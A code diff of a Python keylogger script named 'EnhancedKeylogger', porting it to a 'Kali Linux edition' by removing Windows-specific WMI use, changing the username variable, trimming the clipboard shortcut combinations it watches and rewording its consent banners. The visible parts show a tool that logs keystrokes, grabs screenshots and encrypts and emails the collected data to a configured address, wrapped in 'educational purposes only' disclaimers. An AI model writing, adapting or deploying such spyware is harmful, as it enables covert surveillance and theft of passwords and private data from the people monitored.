@@ -8,11 +8,9 @@
 #  ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
 #                                    KEYLOGGERS
 
-#  ======================================================
-#  IMPORTANT: USE ONLY WITH EXPLICIT USER CONSENT.
-#  This tool is for educational and ethical purposes only.
-#  Unauthorized use may violate privacy laws.
-#  ======================================================
+# ============================================================
+# ⚠️  FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT.
+# ============================================================
 
 import os
 import tempfile
@@ -29,7 +27,6 @@ import shutil
 import sys
 import subprocess
 import time
-import wmi
 import pygetwindow as gw
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -49,17 +46,13 @@ class EnhancedKeylogger:
         self.to_email = to_email
         self.pictures = []
         self.mail = MIMEMultipart()
-        self.c = wmi.WMI()
         self.status = True
-        self.user = os.getenv("USERNAME", "Unknown")
+        self.user = os.getenv("USER", "Unknown")
         self.current_key_list = set()
         self.COMBINATIONS = [
             {keyboard.Key.ctrl, keyboard.KeyCode(char='c')},
-            {keyboard.Key.ctrl, keyboard.KeyCode(char='C')},
             {keyboard.Key.ctrl, keyboard.KeyCode(char='v')},
-            {keyboard.Key.ctrl, keyboard.KeyCode(char='V')},
-            {keyboard.Key.ctrl, keyboard.KeyCode(char='x')},
-            {keyboard.Key.ctrl, keyboard.KeyCode(char='X')}
+            {keyboard.Key.ctrl, keyboard.KeyCode(char='x')}
         ]
         self.encryption_key = encryption_key or Fernet.generate_key()
         self.fernet = Fernet(self.encryption_key)
@@ -79,7 +72,7 @@ class EnhancedKeylogger:
 
     def _validate_config(self):
         if not self.from_email or not self.password or not self.to_email:
-            logging.warning("Email configuration incomplete")
+            logging.warning("Email configuration is incomplete")
 
     def _secure_temp_file(self, suffix='.jpg'):
         fd, path = tempfile.mkstemp(suffix=suffix)
@@ -230,12 +223,13 @@ class EnhancedKeylogger:
         finally:
             logging.info("Keylogger session ended")
 
+
 if __name__ == "__main__":
     print("""
-    ENHANCED KEYLOGGER - SECURE MONITORING TOOL
+    ENHANCED KEYLOGGER - KALI LINUX EDITION
     ===========================================
-    Use only with explicit consent for authorized purposes
-    Unauthorized use violates privacy laws and ethics
+    Use only with explicit consent for authorized purposes.
+    Unauthorized use violates privacy laws and ethics.
     ===========================================
     """)
     try:
